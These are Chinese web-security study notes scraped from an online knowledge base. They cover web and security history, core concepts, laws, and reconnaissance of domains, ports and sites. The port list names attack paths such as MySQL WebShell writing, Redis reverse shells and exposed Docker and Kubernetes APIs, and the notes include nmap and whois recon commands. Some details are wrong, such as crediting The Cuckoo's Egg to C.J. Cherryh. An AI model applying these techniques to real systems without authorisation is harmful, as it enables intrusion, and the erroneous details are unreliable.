# Web安全学习笔记

> 来源：https://websec.readthedocs.io/zh/latest/index.html
> 抓取时间：2026-05-20
> 共计 119/121 页面成功抓取（/tools/sdl.html、/tools/operation.html 抓取失败）

---

## 目录

| 章节 | 页面数 |
|------|--------|
| 一、序章 | 4 |
| 二、计算机网络与协议 | 12 |
| 三、信息收集 | 7 |
| 四、常见漏洞攻防 | 17 |
| 五、语言与框架 | 10 |
| 六、内网渗透 | 5 |
| 七、云安全 | 5 |
| 八、防御技术 | 15 |
| 九、认证机制 | 10 |
| 十、工具与资源 | 17 |
| 十一、手册速查 | 5 |
| 十二、其他 | 14 |

---

---

# Web安全学习笔记 - 序章 + 信息收集

## [1.1. Web技术演化](https://websec.readthedocs.io/zh/latest/basic/history.html)

### 1.1.1. 简单网站

#### 1.1.1.1. 静态页面

Web技术在最初阶段，网站的主要内容是静态的，大多站点托管在ISP上，由文字和图片组成，制作和表现形式也是以表格为主。当时的用户行为也非常简单，基本只是浏览网页。

#### 1.1.1.2. 多媒体阶段

随着技术的不断发展，音频、视频、Flash等多媒体技术诞生了。多媒体的加入使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。

#### 1.1.1.3. CGI阶段

渐渐的，多媒体已经不能满足人们的请求，于是CGI (Common Gateway Interface) 应运而生。CGI定义了Web服务器与外部应用程序之间的通信接口标准，因此Web服务器可以通过CGI执行外部程序，让外部程序根据Web请求内容生成动态的内容。

在这个时候，各种编程语言如PHP/ASP/JSP也逐渐加入市场，基于这些语言可以实现更加模块化的、功能更强大的应用程序。

#### 1.1.1.4. MVC

随着Web应用开发越来越标准化，出现了MVC等思想。MVC是Model/View/Control的缩写，Model用于封装数据和数据处理方法，视图View是数据的HTML展现，控制器Controller负责响应请求，协调Model和View。

Model，View和Controller的分开，是一种典型的关注点分离的思想，使得代码复用性和组织性更好，Web应用的配置性和灵活性也越来越好。而数据访问也逐渐通过面向对象的方式来替代直接的SQL访问，出现了ORM (Object Relation Mapping) 的概念。

除了MVC，类似的设计思想还有MVP、MVVM等。

### 1.1.2. 数据交互

#### 1.1.2.1. 简单数据交互

在Web技术发展最初，前后端交互大部分都使用Web表单、XML、SOAP等较为简单的方式。

#### 1.1.2.2. Ajax

在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是Ajax (Asynchronous Javascript And XML) 技术逐渐流行起来，它使得应用在不更新整个页面的前提下也可以获得或更新数据。这使得Web应用程序更为迅捷地回应用户动作，并避免了在网络上发送那些没有改变的信息。

#### 1.1.2.3. RESTful

在CGI时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。前端主要指网站前台部分，运行在PC端、移动端等浏览器上展现给用户浏览的网页，由HTML5、CSS3、JavaScript组成。后端主要指网站的逻辑部分，涉及数据的增删改查等。

此时，REST (Representation State Transformation) 逐渐成为一种流行的Web架构风格。

REST鼓励基于URL来组织系统功能，充分利用HTTP本身的语义，而不是仅仅将HTTP作为一种远程数据传输协议。一般RESTful有以下的特征：

* 域名和主域名分开  
   * api.example.com  
   * example.com/api/
* 带有版本控制  
   * api.example.com/v1  
   * api.example.com/v2
* 使用URL定位资源  
   * GET /users 获取所有用户  
   * GET /team/:team/users 获取某团队所有用户  
   * POST /users 创建用户  
   * PATCH/PUT /users 修改某个用户数据  
   * DELETE /users 删除某个用户数据
* 用 HTTP 动词描述操作  
   * GET 获取资源，单个或多个  
   * POST 创建资源  
   * PUT/PATCH 更新资源，客户端提供完整的资源数据  
   * DELETE 删除资源
* 正确使用状态码  
   * 使用状态码提高返回数据的可读性
* 默认使用 JSON 作为数据响应格式
* 有清晰的文档

#### 1.1.2.4. GraphQL

部分网络服务场景的数据有复杂的依赖关系，为了应对这些场景，Facebook 推出了 GraphQL ，以图状数据结构对数据进行查询存储。部分网站也应用了 GraphQL 作为 API 交互的方式。

#### 1.1.2.5. 二进制

随着业务对性能的要求提高，前后端开始使用HTTP/2、自定义Protocol Buffer等方式来加快数据交互。

### 1.1.3. 架构演进

随着业务的不断发展，业务架构也越来越复杂。传统的功能被拆分成不同的模块，出现了中间件、中台等概念。代理服务、负载均衡、数据库分表、异地容灾、缓存、CDN、消息队列、安全防护等技术应用越来越广泛，增加了Web开发和运维的复杂度。

客户端的形态越来越多，除了Web之外iOS、Android等其他场景也出现在Web服务的客户端场景。

较早的关系型数据库MySQL、PostgreSQL等已经不能满足需求，出现了Redis/Memcached缓存数据库等一类满足特定需求的数据库。

为了满足特定的业务需求，出现了Lucene/Solr/Elasticsearch搜索应用服务器，Kafka/RabbitMQ/ZeroMQ消息系统，Spark计算引擎，Hive数据仓库平台等不同的基础架构。

#### 1.1.3.1. 中间件

中间件是独立的软件程序，用于管理计算资源和网络通信。常用的功能有过滤IP、合并接口、合并端口、路由、权限校验、负载均衡、反向代理等。

#### 1.1.3.2. 分布式

随着数据量的不断提高，单台设备难以承载这样的访问量，同时不同功能也被拆分到不同的应用中，于是出现了提高业务复用及整合的分布式服务框架(RPC)。

### 1.1.4. 云服务

云计算诞生之前，大部分计算资源是处于"裸金属"状态的物理机，运维人员选择对应规格的硬件，建设机房的 IDC 网络，完成服务的提供，投入硬件基础建设和维护的成本很高。云服务出现之后，使用者可以直接购买云主机，基础设施由供应商管理，这种方式也被称作 IaaS (Infrastructure-as-a-Service) 。

随着架构的继续发展，应用的运行更加细粒度，部署环境容器化，各个功能拆成微服务或是Serverless的架构。

#### 1.1.4.1. Serverless

Serverless 架构由两部分组成，即 Faas (Function-as-a-Service) 和 BaaS (Backend-as-a-Service) 。

FaaS是运行平台，用户上传需要执行的逻辑函数如一些定时任务、数据处理任务等到云函数平台，配置执行条件触发器、路由等等，就可以通过云平台完成函数的执行。

BaaS包含了后端服务组件，它基于 API 完成第三方服务，主要是数据库、对象存储、消息队列、日志服务等等。

#### 1.1.4.2. 微服务

微服务起源于2005年Peter Rodgers博士在云端运算博览会提出的微Web服务 (Micro-Web-Service)，根本思想类似于Unix的管道设计理念。2014年，由Martin Fowler与 James Lewis共同提出了微服务的概念，定义了微服务架构风格是一种通过一套小型服务来开发单个应用的方法，每个服务运行在自己的进程中，并通过轻量级的机制进行通讯 (HTTP API) 。

微服务是一种应用于组件设计和部署架构的软件架构风格。它利用模块化的方式组合出复杂的大型应用程序：

* 各个服务功能内聚，实现与接口分离。
* 各个服务高度自治、相互解耦，可以独立进行部署、版本控制和容量伸缩。
* 各个服务之间通过 API 的方式进行通信。
* 各个服务拥有独立的状态，并且只能通过服务本身来对其进行访问。

随着微服务技术的不断发展，这种思想也被应用到了前端。2018年，第一个微前端工具single-spa出现在github。而后出现了基于single-spa的框架qiankun。

#### 1.1.4.3. API网关

API网关是一个服务器，客户端只需要使用简单的访问方式，统一访问API网关，由API网关来代理对后端服务的访问，同时由于服务治理特性统一放到API网关上面，服务治理特性的变更可以做到对客户端透明，一定程度上实现了服务治理等基础特性和业务服务的解耦，服务治理特性的升级也比较容易实现。

### 1.1.5. 软件开发

#### 1.1.5.1. CI/CD

持续集成 (Continuous Integration, CI) 是让开发人员将工作集成到共享分支中的过程。频繁的集成有助于解决隔离，减少每次提交的大小，以降低合并冲突的可能性。

持续交付 (Continuous Deployment, CD) 是持续集成的扩展，它将构建从集成测试套件部署到预生产环境。这使得它可以直接在类生产环境中评估每个构建，因此开发人员可以在无需增加任何工作量的情况下，验证bug修复或者测试新特性。

### 1.1.6. 参考链接

* [Scaling webapps for newbs](https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/)
* [GitHub 的 Restful HTTP API 设计分解](https://learnku.com/articles/24050)

## [1.2. 网络攻防技术演化](https://websec.readthedocs.io/zh/latest/basic/atkhistory.html)

### 1.2.1. 历史发展

1939年，图灵破解了Enigma，使战争提前结束了两年，这是较早的一次计算机安全开始出现在人们的视野中，这个时候计算机的算力有限，人们使用的攻防方式也相对初级。

1949年，约翰·冯·诺依曼（John Von Neumann）提出了一种可自我复制的程序的设计，这被认为是世界上第一种计算机病毒。

1970年到2009年间，随着因特网不断发展，网络安全也开始进入人们的视野。在网络发展的初期，很多系统都是零防护的，安全意识也尚未普及开来。很多系统的设计也只考虑了可用性，对安全性的考虑不多，所以在当时结合搜索引擎与一些集成渗透测试工具，可以很容易的拿到数据或者权限。

1972年，缓冲区溢出攻击被 Computer Security Technology Planning Study 提出。

1984年，Ken Thompson 在 Reflections on Trusting Trust 一文中介绍了自己如何在编译器中增加后门来获取 Unix 权限的，这也是较早的供应链攻击。

1988年，卡耐基梅隆大学(Carnegie Mellon University, CMU)的一位学生以测试的目的编写了Morris Worm，对当时的互联网造成了极大的损害。

同年，CMU的CERT Coordination Center (CERT-CC)为了处理Morris Worm对互联网造成的破坏，组成了第一个计算机紧急响应小组(Computer Emergency Response Team)，而后全球多个国家、地区、团体都构建了CERT、SRC等组织。

同样是在1988年，Barton Miller教授在威斯康星大学的计算机实验课上，首次提出Fuzz生成器(Fuzz Generator)的概念，用于测试Unix程序的健壮性，即用随机数据来测试程序直至崩溃。因此，Barton Miller教授也被多数人尊称为"模糊测试之父"。

1989年，C.J.Cherryh 发表了小说 The Cuckoo's Egg: Tracking a Spy Through the Maze of Computer Espionage，这本书是作者根据追溯黑客攻击的真实经历改编，在书中提出了蜜罐技术的雏形。

1990年，一些网络防火墙的产品开始出现，此时主要是基于网络的防火墙，可以处理FTP等应用程序。

1993年起，Jeff Moss开始每年在美国内华达州的拉斯维加斯举办 DEFCON (也写做 DEF CON, Defcon, or DC, 全球最大的计算机安全会议之一)。CTF (Capture The Flag) 比赛的形式也是起源于1996年的 DEFCON。

1993年7月，Windows NT 3.1发布，引入了身份认证、访问控制和安全审计等安全控制机制，在此之前的 Windows 9x 内核几乎没有任何安全性机制。

1996年，Smashing the Stack For Fun and Profit发表，在堆栈的缓冲区溢出的利用方式上做出了开创性的工作。

1997年起，Jeff Moss开始举办 Black Hat，以中立的立场进行信息安全研究的交流和培训，到目前为止，Black Hat 也会在欧洲和亚洲举行。

1998年12月，Jeff Forristal在一篇文章中提到了使用SQL注入的技巧攻击一个网站的例子，从此SQL注入开始被广泛讨论。

1999年1月21日-22日的第二届 Research with Security Vulnerability Databases 的 WorkShop 上，MITRE 的创始人 David E. Mann 和 Steven M. Christey 发表了一篇名为《Towards a Common Enumeration of Vulnerabilities》的白皮书，提出了CVE (Common Vulnerabilities and Exposures, 通用漏洞披露) 的概念，在当年收录并公开了321个CVE漏洞。

1999年12月，MSRC的一些工程师发现了一些网站被注入代码的例子，他们在整理讨论后公开了这种攻击，并称为 Cross Site Scripting。

2001年9月9日，Mark Curphey启动了OWASP (Open Web Application Security Project) 项目，开始在社区中提供一些Web攻击技术的文章、方法和工具等。

2002年1月，Microsoft发起了 "可信赖计算" (Trustworthy Computing) 计划，以帮助确保产品和服务在本质上具有高度安全性，可用性，可靠性以及业务完整性，SDL (Security Development Lifecycle) 也在此时被提出。

2002年10月4日，Kevin Mitnick 编著的 The Art of Deception (欺骗的艺术) 出版，这本书详细的介绍了社会工程学在攻击中是如何应用的，Kevin Mitnick 也被认为是社会工程学的开山鼻祖。

2005年7月25日，Zero Day Initiative (ZDI) 创建，鼓励负责任的漏洞披露。

2005年11月，基于从1941年2月开始的情报收集积累和发展，Director of National Intelligence 宣布成立 Open Source Center (OSC)，进行开源情报的收集，而后 Open-source intelligence (OSINT) 的概念也不断被人们认知。

2006年，APT(Advanced Persistent Threat, 高级持续威胁) 攻击的概念被正式提出，用来描述从20世纪90年代末到21世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。

2006年起，美国国土安全部（DHS）开始每两年举行一次 "网络风暴" (Cyber Storm) 系列国家级网络事件演习。

随着时代不断的发展，攻防技术有了很大的改变，防御手段、安全意识也随着演化。在攻击发生前有威胁情报、黑名单共享等机制，威胁及时能传播。在攻击发生时有基于各种机制的防火墙如关键字检测、语义分析、深度学习，有的防御机制甚至能一定程度上防御零日攻击。在攻击发生后，一些关键系统系统做了隔离，攻击成果难以扩大，就算拿到了目标也很难做进一步的攻击。也有的目标蜜罐仿真程度很高，有正常的服务和一些难以判断真假的业务数据。

2010年6月，震网 (Stuxnet) 被发现，在这之后供应链攻击事件开始成为网络空间安全的新兴威胁之一。随后的XcodeGhost、CCleaner等供应链攻击事件都造成了重大影响。

在2010年Forrester Research Inc.的分析师提出了"零信任"的概念模型时。

2012年1月，Gartner 公司提出了 IAST (Interactive Application Security Testing) 的概念，提供了结合 DAST 和 SAST 两种技术的解决方案。这种方式漏洞检出率高、误报率低，同时可以定位到API接口和代码片段。

2012年9月，Gartner 公司研究员 David Cearley 提出了 DevSecOps 的概念，表示 DevOps 的流程应该包含安全理念。

2013年，MITRE 提出了 ATT&CK™ (Adversarial Tactics, Techniques, and Common Knowledge, ATT&CK)，这是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。

2013年，Michigan 大学开始了 ZMap 项目，在2015年这个项目演化为 Censys，从这之后网络空间测绘的项目逐渐出现。

2014年，在 Gartner Security and Risk Management Summit 上，Runtime Application Self-protection (RASP) 的概念被提出，在应用层进行安全保护。

2015年，Gartner 首次提出了 SOAR 的概念，最初的定义是 Security Operations, Analytics and Reporting，即安全运维分析与报告。

2017年，Gartner 对 SOAR 概念做了重新定义：Security Orchestration, Automation and Response, 即安全编排、自动化与响应。

在此之后，Responsible disclosure / Full disclosure 等概念也不断进入人们的视野之中。

### 1.2.2. 参考链接

- [OWASP](https://en.wikipedia.org/wiki/OWASP)
- [NT Web Technology Vulnerabilities](http://www.phrack.com/issues.html?issue=54&id=8)
- [History of CVE](https://cve.mitre.org/about/history.html)
- [history of some vulnerabilities and exploit techniques](https://documents.pub/document/history-of-some-vulnerabilities-and-exploit-techniques.html)
- [securitydigest](http://securitydigest.org/)
- [Early Computer Security Papers: Ongoing Collection](http://seclab.cs.ucdavis.edu/projects/history/CD/)
- [Security Mailing List Archive](https://seclists.org/)
- [Computer Security Technology Planning Study](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf)
- [Smashing The Stack For Fun And Profit](https://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack%5Fsmashing.pdf)
- [Happy 10th birthday Cross-Site Scripting!](https://docs.microsoft.com/en-us/archive/blogs/dross/happy-10th-birthday-cross-site-scripting)
- [About Microsoft SDL](https://www.microsoft.com/en-us/securityengineering/sdl/about)
- [ABOUT ZDI](https://www.zerodayinitiative.com/about/)
- [Open-source intelligence](https://en.wikipedia.org/wiki/Open-source%5Fintelligence)
- [Runtime Application Self-protection (RASP)](https://www.gartner.com/en/information-technology/glossary/runtime-application-self-protection-rasp)
- [ZMap: Fast Internet-Wide Scanning and its Security Applications](https://zmap.io/paper.pdf)
- [A Search Engine Backed by Internet-Wide Scanning](https://censys.io/static/censys.pdf)
- [Black hat About](https://www.blackhat.com/about.html)
- [The DEF CON Story](https://www.defcon.org/html/links/dc-about.html)
- [Reflections on Trusting Trust](https://users.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf)
- [What is DevSecOps?](https://www.devsecops.org/blog/2015/2/15/what-is-devsecops)

## [1.3. 网络安全观](https://websec.readthedocs.io/zh/latest/basic/outlook.html)

### 1.3.1. 网络安全定义

网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。

网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。

网络安全的基本需求包括：

- 可靠性
- 可用性
- 保密性
- 完整性
- 不可抵赖性
- 可控性
- 可审查性
- 真实性

其中三个最基本的要素是**机密性 (Confidentiality)**、**完整性 (Integrity)**、**可用性 (Availability)**。

#### 机密性

是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。

#### 完整性

是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。

#### 可用性

指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。

#### 网络安全的主体

是保护网络上的数据和通信的安全：

- **数据安全性**：是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等
- **通信安全性**：是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施

### 1.3.2. 系统脆弱性

信息系统本身是脆弱的，信息系统的硬件资源、通信资源、软件及信息资源等都可能因为可预见或不可预见甚至恶意的原因而可能导致系统受到破坏、更改、泄露和功能失效，从而使系统处于异常状态，甚至崩溃瘫痪。

#### 硬件资源的脆弱性

主要表现为物理安全方面的问题，多源于设计，采用软件程序的方法见效不大。

#### 软件的脆弱性

来源于设计和软件工程实施中遗留问题，如：

- 设计中的疏忽
- 内部设计的逻辑混乱
- 没有遵守信息系统安全原则进行设计

## [1.4. 法律与法规](https://websec.readthedocs.io/zh/latest/basic/law.html)

### 1.4.1. 相关链接

以下是与中国网络安全相关的法律法规链接：

- [中华人民共和国网络安全法](http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm)
- [网络产品安全漏洞管理规定](http://www.gov.cn/zhengce/zhengceku/2021-07/14/content_5624965.htm)
- [关键信息基础设施安全保护条例](http://www.gov.cn/zhengce/content/2021-08/17/content_5631671.htm)
- [中华人民共和国个人信息保护法](http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml)
- [中华人民共和国数据安全法](http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml)

## [3.1. 网络入口/信息](https://websec.readthedocs.io/zh/latest/info/network.html)

### 内容概述

这是来自 Web安全知识库的一个信息收集章节，介绍了网络入口和信息收集的相关分类。

### 主要内容

#### 网络入口/信息

该章节主要涵盖以下网络信息收集类别：

**网络拓扑信息**
- 外网出口

**IP信息**
- C段

**线下网络**
- Wi-Fi
  - SSID
  - 认证信息

**VPN**
- 厂商
- 登录方式

**其他入口**
- 邮件网关
- 手机APP
- 小程序后台
- OA
- SSO
- 边界网络设备
- 上游运营商

## [3.2. 域名信息](https://websec.readthedocs.io/zh/latest/info/domain.html)

### 3.2.1. Whois

[Whois](https://www.whois.com/) 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。

### 3.2.2. 搜索引擎搜索

搜索引擎通常会记录域名信息，可以通过 `site: domain` 的语法来查询。

### 3.2.3. 第三方查询

网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表 中查找。

- [DNSDumpster](https://dnsdumpster.com/)
- [Virustotal](https://www.virustotal.com/)
- CrtSearch
- threatminer
- Censys

### 3.2.4. ASN信息关联

在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元 (例如一所大学，一个企业或者一个公司个体) 。

一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的16位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过ASN号来查找可能相关的IP，例如：

```bash
whois -h whois.radb.net -- '-i origin AS111111' | grep -Eo "([0-9.]+){4}/[0-9]+" | uniq
nmap --script targets-asn --script-args targets-asn.asn=15169
```

### 3.2.5. 域名相关性

同一个企业/个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种操作步骤如下：

- 查询域名注册邮箱
- 通过域名查询备案号
- 通过备案号查询域名
- 反查注册邮箱
- 反查注册人
- 通过注册人查询到的域名在查询邮箱
- 通过上一步邮箱去查询域名
- 查询以上获取出的域名的子域名

此外，部分公司在注册域名时，会注册不同 tld 的域名，例如 example.com / example.cn 。但是不同 tld 的域名也可能是由其它人注册的，需要另外辨别。

### 3.2.6. 网站信息利用

网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。

网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在JavaScript文件、资源文件链接等位置。

网站的安全策略如跨域策略、CSP规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个SSL/TLS证书，因此有时可通过证书来获取相关域名信息。

### 3.2.7. HTTPS证书

#### 3.2.7.1. 证书透明度

为了保证HTTPS证书不会被误发或伪造，CA会将证书记录到可公开验证、不可篡改且只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。

#### 3.2.7.2. SAN

主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用SAN证书。SAN允许在安全证书中使用subjectAltName字段将多种值与证书关联，这些值被称为主题备用名称。

### 3.2.8. 域传送漏洞

DNS域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。

一般来说，域传送操作应该只允许可信的备用DNS服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个DNS服务器的域名信息。这种错误授权被称作是DNS域传送漏洞。

### 3.2.9. Passive DNS

Passive DNS被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用Passive DNS数据库可以知道域名曾绑定过哪些IP，IP曾关联到哪些域名，域名最早/最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL等网站都提供了Passive DNS数据库的查询。

### 3.2.10. 泛解析

泛解析是把 \*.example.com 的所有A记录都解析到某个IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。

### 3.2.11. 重要记录

#### 3.2.11.1. CNAME

CNAME即Canonical name，又称alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的CDN加速功能利用了该记录。

#### 3.2.11.2. MX记录

MX记录即Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找SMTP服务器信息。

#### 3.2.11.3. NS记录

NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个DNS服务器来进行解析。

#### 3.2.11.4. SPF记录

SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种DNS记录类型，是一种TXT类型的记录，用于登记某个域名拥有的用来外发邮件的所有IP地址。通过SPF记录可以获取相关的IP信息，常用命令为 `dig example.com txt` 。

### 3.2.12. CDN

#### 3.2.12.1. CDN验证

可通过多地ping的方式确定目标是否使用了CDN，常用的网站有 `http://ping.chinaz.com/` `https://asm.ca.com/en/ping.php` 等。

#### 3.2.12.2. 域名查找

使用了CDN的域名的父域或者子域名不一定使用了CDN，可以通过这种方式去查找对应的IP。

#### 3.2.12.3. 历史记录查找

CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。

#### 3.2.12.4. 邮件信息

通过社会工程学的方式进行邮件沟通，从邮件头中获取IP地址，IP地址可能是网站的真实IP或者是目标的出口IP。

### 3.2.13. 子域爆破

在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。

### 3.2.14. 缓存探测技术

在企业网络中通常都会配置DNS服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。

## [3.3. 端口信息](https://websec.readthedocs.io/zh/latest/info/port.html)

### 3.3.1. 常见端口及其脆弱点

* FTP (21/TCP)  
   * 默认用户名密码 `anonymous:anonymous`  
   * 暴力破解密码  
   * VSFTP某版本后门
* SSH (22/TCP)  
   * 部分版本SSH存在漏洞可枚举用户名  
   * 暴力破解密码
* Telent (23/TCP)  
   * 暴力破解密码  
   * 嗅探抓取明文密码
* SMTP (25/TCP)  
   * 无认证时可伪造发件人
* DNS (53/UDP & 53/TCP)  
   * 域传送漏洞  
   * DNS劫持  
   * DNS缓存投毒  
   * DNS欺骗  
   * SPF / DMARC Check  
   * DDoS  
         * DNS Query Flood  
         * DNS 反弹  
   * DNS 隧道
* DHCP 67/68  
   * 劫持/欺骗
* TFTP (69/TCP)
* HTTP (80/TCP)
* Kerberos (88/TCP)  
   * 主要用于监听KDC的票据请求  
   * 用于进行黄金票据和白银票据的伪造
* POP3 (110/TCP & 995/TCP)  
   * 爆破
* RPC (135/TCP)  
   * wmic 服务利用
* NetBIOS (137/UDP & 138/UDP)  
   * 未授权访问  
   * 弱口令
* NetBIOS / Samba (139/TCP)  
   * 未授权访问  
   * 弱口令
* IMAP (143/TCP & 993/TCP)
* SNMP (161/TCP & 161/UDP)  
   * Public 弱口令
* LDAP (389/TCP)  
   * 用于域上的权限验证服务  
   * 匿名访问  
   * 注入
* HTTPS (443/TCP)
* SMB (445/TCP)  
   * Windows 协议簇，主要功能为文件共享服务  
   * `net use \\192.168.1.1 /user:xxx\username password`
* Linux Rexec (512/TCP & 513/TCP & 514/TCP)  
   * 弱口令
* Rsync (873/TCP)  
   * 未授权访问
* RPC (1025/TCP)  
   * NFS匿名访问
* Java RMI (1090/TCP & 1099/TCP)  
   * 反序列化远程命令执行漏洞
* MSSQL (1433/TCP)  
   * 弱密码  
   * 差异备份 GetShell  
   * SA 提权
* Oracle (1521/TCP)  
   * 弱密码
* NFS (2049/TCP)  
   * 权限设置不当  
   * `showmount <host>`
* ZooKeeper (2171/TCP & 2375/TCP)  
   * 无身份认证
* Docker Remote API (2375/TCP)  
   * 未限制IP / 未启用TLS身份认证  
   * `http://docker.addr:2375/version`
* MySQL (3306/TCP)  
   * 弱密码  
   * 日志写WebShell  
   * UDF提权  
   * MOF提权
* RDP / Terminal Services (3389/TCP)  
   * 弱密码
* Postgres (5432/TCP)  
   * 弱密码  
   * 执行系统命令
* VNC (5900/TCP)  
   * 弱密码
* CouchDB (5984/TCP)  
   * 未授权访问
* WinRM (5985/TCP)  
   * Windows对WS-Management的实现  
   * 在Vista上需要手动启动，在Windows Server 2008中服务是默认开启的
* Redis (6379/TCP)  
   * 无密码或弱密码  
   * 绝对路径写 WebShell  
   * 计划任务反弹 Shell  
   * 写 SSH 公钥  
   * 主从复制 RCE  
   * Windows 写启动项
* Kubernetes API Server (6443/TCP && 10250/TCP)  
   * `https://Kubernetes:10250/pods`
* JDWP (8000/TCP)  
   * 远程命令执行
* ActiveMQ (8061/TCP)
* Jenkin (8080/TCP)  
   * 未授权访问
* Elasticsearch (9200/TCP)  
   * 代码执行  
   * `http://es.addr:9200/_plugin/head/`  
   * `http://es.addr:9200/_nodes`
* Memcached (11211/TCP & 11211/UDP)  
   * 未授权访问
* RabbitMQ (15672/TCP & 15692/TCP & 25672/TCP)
* MongoDB (27017/TCP)  
   * 无密码或弱密码
* Hadoop (50070/TCP & 50075/TCP)  
   * 未授权访问

除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞

### 3.3.2. 常见端口扫描技术

#### 3.3.2.1. 全扫描

扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。

全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。

#### 3.3.2.2. 半扫描

半扫描也称SYN扫描，在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且现在的大部分防火墙已经开始对这种扫描方式做处理。

#### 3.3.2.3. FIN扫描

FIN扫描是向目标发送一个FIN数据包，如果是开放的端口，会返回RST数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。

这种方式并不在TCP三次握手的状态中，所以不会被记录，相对SYN扫描要更隐蔽一些。

### 3.3.3. Web服务

* Jenkins  
   * 未授权访问
* Gitlab  
   * 对应版本CVE
* Zabbix  
   * 权限设置不当

### 3.3.4. 批量搜索

* Censys
* Shodan
* ZoomEye

## [3.4. 站点信息](https://websec.readthedocs.io/zh/latest/info/site.html)

### 判断网站操作系统

- Linux大小写敏感
- Windows大小写不敏感

### 扫描敏感文件

- robots.txt
- crossdomain.xml
- sitemap.xml
- xx.tar.gz
- xx.bak
- 等

### 确定网站采用的语言

- 如PHP / Java / Python等
- 找后缀，比如php/asp/jsp

### 前端框架

- 如jQuery / BootStrap / Vue / React / Angular等
- 查看源代码

### 中间服务器

- 如 Apache / Nginx / IIS 等
- 查看header中的信息
- 根据报错信息判断
- 根据默认页面判断

### Web容器服务器

- 如Tomcat / Jboss / Weblogic等

### 后端框架

- 根据Cookie判断
- 根据CSS / 图片等资源的hash值判断
- 根据URL路由判断
  - 如wp-admin
- 根据网页中的关键字判断
- 根据响应头中的X-Powered-By

### CDN信息

- 常见的有Cloudflare、yunjiasu

### 探测有没有WAF，如果有，什么类型的

- 有WAF，找绕过方式
- 没有，进入下一步

### 扫描敏感目录

- 看是否存在信息泄漏
- 扫描之前先自己尝试几个的url，人为看看反应

### 使用爬虫爬取网站信息

### 推测更多目录及文件名

- 拿到一定信息后，通过拿到的目录名称、文件名称及文件扩展名了解网站开发人员的命名思路
- 确定其命名规则
- 推测出更多的目录及文件名

### 常见入口目标

- 关注度低的系统
- 业务线较长的系统

## [3.5. 搜索引擎利用](https://websec.readthedocs.io/zh/latest/info/searchEngine.html)

